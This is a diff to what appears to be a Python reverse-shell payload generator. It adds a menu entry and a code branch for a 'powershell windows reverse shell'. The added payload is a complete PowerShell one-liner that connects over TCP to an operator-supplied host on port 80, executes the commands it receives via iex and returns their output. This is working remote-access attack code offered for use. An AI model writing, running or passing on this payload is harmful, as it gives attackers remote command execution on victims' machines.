@@ -17,6 +17,8 @@ try:
     [7] ruby reverse shell               [8] java reverse shell
 
     [9] python reverse shell             [10] gawk reverse shell
+    
+    [11] powershell windows reverse shell
 
                 Choose a type of shell from above
         """)
@@ -49,6 +51,8 @@ try:
                 shell = "python"
             elif shelltype == "10":
                 shell = "gawk"
+            elif shelltype == "11":
+                shell = "powershell windows"
             return shell, lhost
         else:
             os.system("clear")
@@ -131,6 +135,12 @@ try:
                     close(Service)
             }
     }"""
+            payload2 = ""
+            payload3 = ""
+            payload4 = ""
+            #                shell = "powershell windows"
+        elif shell == "powershell windows":
+            payload1 = '''powershell $client = New-Object System.Net.Sockets.TCPClient("''' +lhost+ '''",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'''
             payload2 = ""
             payload3 = ""
             payload4 = ""
